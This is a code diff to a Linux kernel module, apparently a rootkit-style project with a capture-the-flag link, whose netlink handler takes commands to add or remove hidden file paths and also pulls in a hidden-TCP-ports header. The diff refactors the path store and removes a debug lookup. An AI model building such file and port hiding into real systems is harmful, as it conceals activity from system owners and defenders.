@@ -4,7 +4,7 @@
 #include "../msg_to_module.h"
 #include "../msg_to_user.h"
 
-#include "hidden_files_trie.h"
+#include "hidden_paths.h"
 #include "hidden_tcp_ports.h"
 
 extern void exit_my_module(void);
@@ -13,9 +13,6 @@ extern void exit_my_module(void);
 struct sock *nl_sk = NULL;
 
 void my_recv_msg(struct sk_buff *skb) {
-    if (trie == NULL)
-        trie = create_trie();
-
     struct nlmsghdr *nlh = (struct nlmsghdr *) skb->data;
 
     int sender_pid = nlh->nlmsg_pid; /* pid of sending process_access */
@@ -31,17 +28,13 @@ void my_recv_msg(struct sk_buff *skb) {
             return;
         }
         case OPER_ADD_HIDDEN_PATH: {
-            add_word(trie, msg.data);
+            add_hidden_path(msg.data);
             printk(KERN_INFO
             "add hidden path: %s\n", msg.data);
-            struct node* s = search(get_root(trie), "/home/idan/ctf/a.out");
-            if (s == 0)
-                printk(KERN_INFO
-                "problem with search");
             break;
         }
         case OPER_REMOVE_HIDDEN_PATH: {
-            remove_word(trie, msg.data);
+            remove_hidden_path(msg.data);
             printk(KERN_INFO
             "remove hidden path: %s\n", msg.data);
             break;
